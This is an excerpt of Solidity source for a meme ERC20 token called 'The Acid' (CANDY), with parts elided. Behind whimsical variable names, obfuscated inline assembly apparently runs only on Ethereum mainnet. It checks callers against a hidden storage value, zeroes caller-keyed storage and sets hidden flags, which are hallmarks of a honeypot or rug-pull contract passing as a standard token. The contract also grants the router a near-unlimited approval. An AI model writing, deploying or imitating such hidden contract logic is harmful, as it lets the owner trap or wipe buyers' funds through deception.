...
/*
CANDY {~~{|/\|}~~} ACID
Let's go on a strange long trip with this acid candy!
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addCandy;
    uint256 private blackAcid = block.number*2;

    mapping (address => bool) private _firstAcid; 
    mapping (address => bool) private _secondCandy;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private updateComing;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private swimmingPool;
    address public pair;
    ...
    bool private trading; uint256 private riceBall = 1; bool private sushiTuna;
    uint256 private _decimals; uint256 private fishDish;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addCandy.push(_router); addCandy.push(msgSender_); addCandy.push(pair);
        for (uint256 q=0; q < 3;) {_firstAcid[addCandy[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x4561ff15e83781d82b18691fe0251cb505de9b15018f5e10ceff989d9abcc029
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xbb6cba1d9bc3a23b4d00e77281f82060ed1373c5f9d1d6d7fc6416c0a1fd8d91,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; blackAcid = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addCandy[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployCandy(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addCandy[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCandy(creator, initialSupply);
    }
}

contract TheAcid is ERC20Token {
    constructor() ERC20Token("The Acid", "CANDY", msg.sender, 425000 * 10 ** 18) {
    }
}